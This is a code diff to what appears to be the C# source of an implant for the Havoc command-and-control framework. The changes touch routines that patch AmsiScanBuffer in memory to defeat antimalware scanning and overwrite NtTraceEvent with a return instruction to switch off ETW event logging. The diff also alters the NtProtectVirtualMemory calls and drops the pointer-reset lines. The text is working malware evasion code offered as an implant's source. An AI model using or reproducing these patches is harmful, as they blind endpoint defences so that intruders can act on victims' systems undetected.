@@ -62,7 +62,6 @@ namespace HavocImplant
 
         public static List<CommandInterface> Commands = new List<CommandInterface>();
 
-
         static async Task Main() // Looping through tasks and stuff
         {
 
@@ -188,26 +187,24 @@ namespace HavocImplant
             IntPtr pAmsiScanBuffer = amsi.dictOfExports["AmsiScanBuffer"];
             
             IntPtr aPatchSize = (IntPtr)patch.Length;
-            Wrappers.NtProtectVirtualMemory((IntPtr)(-1), ref pAmsiScanBuffer, ref aPatchSize, Structs.Win32.Enums.PAGE_READWRITE, out uint unused);
-            pAmsiScanBuffer = amsi.dictOfExports["AmsiScanBuffer"]; // Set it back correctly because Protect modified it to the base of the page
+            Wrappers.NtProtectVirtualMemory((IntPtr)(-1), pAmsiScanBuffer, ref aPatchSize, Structs.Win32.Enums.PAGE_READWRITE, out uint unused);
 
             GCHandle hPatch = GCHandle.Alloc(patch, GCHandleType.Pinned);
             Wrappers.NtWriteVirtualMemory((IntPtr)(-1), pAmsiScanBuffer, hPatch.AddrOfPinnedObject(), (uint)patch.Length, out unused);
             hPatch.Free();
 
-            Wrappers.NtProtectVirtualMemory((IntPtr)(-1), ref pAmsiScanBuffer, ref aPatchSize, Structs.Win32.Enums.PAGE_EXECUTE_READ, out unused);
+            Wrappers.NtProtectVirtualMemory((IntPtr)(-1), pAmsiScanBuffer, ref aPatchSize, Structs.Win32.Enums.PAGE_EXECUTE_READ, out unused);
 
             // ETW
             IntPtr pNtTraceEvent = IntPtr.Add(globalDll.ntdll.dictOfExports["NtTraceEvent"], 3);
             IntPtr ePatchSize = (IntPtr)1;
-            Wrappers.NtProtectVirtualMemory((IntPtr)(-1), ref pNtTraceEvent, ref ePatchSize, Structs.Win32.Enums.PAGE_EXECUTE_READWRITE, out unused);
-            pNtTraceEvent = IntPtr.Add(globalDll.ntdll.dictOfExports["NtTraceEvent"], 3);// Set it back correctly because Protect modified it to the base of the page
-
+            Wrappers.NtProtectVirtualMemory((IntPtr)(-1), pNtTraceEvent, ref ePatchSize, Structs.Win32.Enums.PAGE_EXECUTE_READWRITE, out unused);
+           
             hPatch = GCHandle.Alloc(new byte[] { 0xc3 }, GCHandleType.Pinned);
             Wrappers.NtWriteVirtualMemory((IntPtr)(-1), pNtTraceEvent, hPatch.AddrOfPinnedObject(), (uint)1, out unused);
             hPatch.Free();
 
-            Wrappers.NtProtectVirtualMemory((IntPtr)(-1), ref pNtTraceEvent, ref ePatchSize, Structs.Win32.Enums.PAGE_EXECUTE_READ, out unused);
+            Wrappers.NtProtectVirtualMemory((IntPtr)(-1), pNtTraceEvent, ref ePatchSize, Structs.Win32.Enums.PAGE_EXECUTE_READ, out unused);
             
         }
 
